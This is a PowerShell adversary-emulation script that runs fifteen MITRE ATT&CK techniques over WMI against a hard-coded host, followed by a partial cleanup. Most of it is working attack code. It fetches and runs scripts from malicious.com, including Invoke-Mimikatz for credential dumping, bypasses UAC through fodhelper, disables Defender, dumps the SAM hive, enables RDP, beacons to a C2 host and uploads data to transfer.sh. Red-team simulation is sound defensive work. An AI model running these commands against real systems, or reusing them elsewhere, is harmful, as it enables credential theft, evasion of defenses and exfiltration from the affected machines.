# ==================================================
# Multi-Technique MITRE ATT&CK Simulation with Cleanup
# Executes commands remotely via WMI on $TargetComputer
# Creator: JPL
# ==================================================

$TargetComputer = "10.28.14.124"
$TempDir = "C:\temp"

# --------------------------------------------------------------------
# Helper: Run a PowerShell command on the remote machine via WMI
# --------------------------------------------------------------------
function Invoke-RemotePS {
    param([string]$Command)
    $argumentList = "powershell -ExecutionPolicy Bypass -Command `"$Command`""
    Invoke-WmiMethod -Class Win32_Process -Name Create -ComputerName $TargetComputer -ArgumentList $argumentList | Out-Null
    Start-Sleep -Seconds 1   # Brief pause to avoid overlapping WMI calls
}

# --------------------------------------------------------------------
# 1. Ensure temporary directory exists on target
# --------------------------------------------------------------------
Write-Host "[*] Creating $TempDir on target..."
Invoke-RemotePS "New-Item -ItemType Directory -Force -Path $TempDir"

# --------------------------------------------------------------------
# ATTACK PHASE – Execute all techniques
# --------------------------------------------------------------------
Write-Host "[*] Starting attack techniques..."

# 1. Execution: PowerShell Download Cradle (T1059.001)
Invoke-RemotePS "IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/script.ps1')"

# 2. Persistence: Registry Run Key (T1547.001)
Invoke-RemotePS "New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'Updater' -Value 'powershell.exe -NoP -W Hidden -Command calc.exe' -Force"

# 3. Privilege Escalation: Bypass UAC via fodhelper (T1548.002)
Invoke-RemotePS "Set-ItemProperty -Path 'HKCU:\Software\Classes\ms-settings\shell\open\command' -Name '(Default)' -Value 'cmd.exe' -Force; Start-Process 'C:\Windows\System32\fodhelper.exe'"

# 4. Defense Evasion: Disable Windows Defender Real-Time Monitoring (T1562.001)
Invoke-RemotePS "Set-MpPreference -DisableRealtimeMonitoring `$true"

# 5. Credential Access: SAM Registry Hive Dump (T1003.002)
Invoke-RemotePS "reg save HKLM\SAM $TempDir\sam.save"

# 6. Discovery: System Information Collection (T1082)
Invoke-RemotePS "systeminfo > $TempDir\sysinfo.txt"

# 7. Lateral Movement: Enable RDP (T1021.001)
Invoke-RemotePS "Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name fDenyTSConnections -Value 0"

# 8. Collection: Screen Capture (T1113)
Invoke-RemotePS @"
Add-Type -AssemblyName System.Drawing; 
Add-Type -AssemblyName System.Windows.Forms; 
`$screen = [System.Windows.Forms.SystemInformation]::VirtualScreen; 
`$bitmap = New-Object System.Drawing.Bitmap `$screen.Width, `$screen.Height; 
`$graphics = [System.Drawing.Graphics]::FromImage(`$bitmap); 
`$graphics.CopyFromScreen(`$screen.X, `$screen.Y, 0, 0, `$screen.Size); 
`$bitmap.Save('$TempDir\screenshot.png')
"@

# 9. Command and Control: DNS over HTTPS Beacon (T1572)
Invoke-RemotePS "Invoke-WebRequest -Uri 'https://c2.example.com/beacon' -Method GET"

# 10. Exfiltration: Upload File via Web Request (T1567)
Invoke-RemotePS "Invoke-WebRequest -Uri 'https://transfer.sh/file' -Method POST -InFile $TempDir\sysinfo.txt"

# 11. Impact: File Encryption Simulation (T1486) – rename .doc files to .doc.encrypted
Invoke-RemotePS "Get-ChildItem $TempDir\*.doc | Rename-Item -NewName { `$_.Name + '.encrypted' }"

# 12. Persistence: Scheduled Task (T1053.005)
Invoke-RemotePS "Register-ScheduledTask -TaskName 'Update' -Trigger (New-ScheduledTaskTrigger -Daily -At '09:00') -Action (New-ScheduledTaskAction -Execute 'calc.exe') -Force"

# 13. Credential Access: Mimikatz via PowerShell (T1003.001) – downloads and runs
Invoke-RemotePS "IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"

# 14. Lateral Movement: SMB Admin Share Access (T1021.002)
Invoke-RemotePS "dir \\$TargetComputer\C$"

# 15. Discovery: Domain Trust Discovery (T1482)
Invoke-RemotePS "nltest /domain_trusts"

Write-Host "[+] Attack phase completed."

# --------------------------------------------------------------------
# CLEANUP PHASE – Revert all changes
# --------------------------------------------------------------------
Write-Host "[*] Starting cleanup..."

# 2. Remove Registry Run key
Invoke-RemotePS "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'Updater' -ErrorAction SilentlyContinue"

# 3. Remove UAC bypass registry key
Invoke-RemotePS "Remove-Item -Path 'HKCU:\Software\Classes\ms-settings\' -Recurse -ErrorAction SilentlyContinue"

# 4. Re-enable Windows Defender Real-Time Monitoring
Invoke-RemotePS "Set-MpPreference -DisableRealtimeMonitoring `$false"

# 5. Delete saved SAM hive
Invoke-RemotePS "Remove-Item -Path $TempDir\sam.save -ErrorAction SilentlyContinue"

# 6. Delete systeminfo output
Invoke-RemotePS "Remove-Item -Path $TempDir\sysinfo.txt -ErrorAction SilentlyContinue"

# 7. Disable RDP (revert to deny connections)
Invoke-RemotePS "Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name fDenyTSConnections -Value 1"

# 8. Delete screenshot
Invoke-RemotePS "Remove-Item -Path $TempDir\screenshot.png -ErrorAction SilentlyContinue"

# 11. Rename .doc.encrypted files back to .doc
Invoke-RemotePS "Get-ChildItem $TempDir\*.doc.encrypted | Rename-Item -NewName { `$_.Name -replace '\.doc\.encrypted$','.doc' }"

# 12. Remove scheduled task
Invoke-RemotePS "Unregister-ScheduledTask -TaskName 'Update' -Confirm:`$false -ErrorAction SilentlyContinue"

# Optional: Remove the temp directory if you want it completely clean
# Invoke-RemotePS "Remove-Item -Path $TempDir -Recurse -Force -ErrorAction SilentlyContinue"

Write-Host "[+] Cleanup completed. System should be back to its original state."
